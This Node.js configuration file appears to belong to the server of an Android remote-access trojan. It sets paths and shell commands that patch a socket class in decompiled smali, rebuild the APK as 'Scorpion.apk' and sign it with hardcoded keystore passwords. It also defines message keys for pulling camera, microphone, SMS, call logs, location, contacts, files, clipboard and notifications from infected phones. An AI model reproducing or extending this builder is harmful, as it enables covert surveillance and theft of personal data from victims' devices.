const path = require('path');
exports.DEBUG = false;
exports.WEB_PORTS = 22533;
exports.CONTROL_PORT = 22222;

///ALL PATHS///////////////
exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk');
exports.apkOutputPath = path.join(__dirname, '../assets/webpublic');
exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/Scorpion.apk');

exports.downloadsFolder = '/client_downloads';
exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder);

exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool_2.5.0.jar');
exports.apkSign = path.join(__dirname, '../app/factory/', 'uber-apk-signer-1.2.1.jar');
exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
exports.certPath = path.join(__dirname, '../app/factory/release.jks');

exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/example/project20/IOSocket.smali');

///FOR BUILDING THE APK FILE AT SERVER SIDE ////////
exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
exports.signCommand = 'java -jar "' + exports.apkSign + '" -a "' + exports.apkBuildPath + '" --ks "' + exports.certPath + '" --ksAlias key0 --ksPass android --ksKeyPass android --out "' + exports.apkOutputPath + '"';

///////ALL KEYS WHICH WE WANT TO RETRIEVE DATA FROM CLIENT//////
exports.messageKeys = {
    camera: '0xCA',
    files: '0xFI',
    call: '0xCL',
    sms: '0xSM',
    mic: '0xMI',
    location: '0xLO',
    contacts: '0xCO',
    wifi: '0xWI',
    notification: '0xNO',
    clipboard: '0xCB',
    installed: '0xIN',
    permissions: '0xPM',
    gotPermission: '0xGP'
}


exports.logTypes = {
     error: {
        name: 'ERROR',
        color: 'red'
    },
    alert: {
        name: 'ALERT',
        color: 'amber'
    },
    success: {
        name: 'SUCCESS',
        color: 'limegreen'
    },
    info: {
        name: 'INFO',
        color: 'blue'
    }
}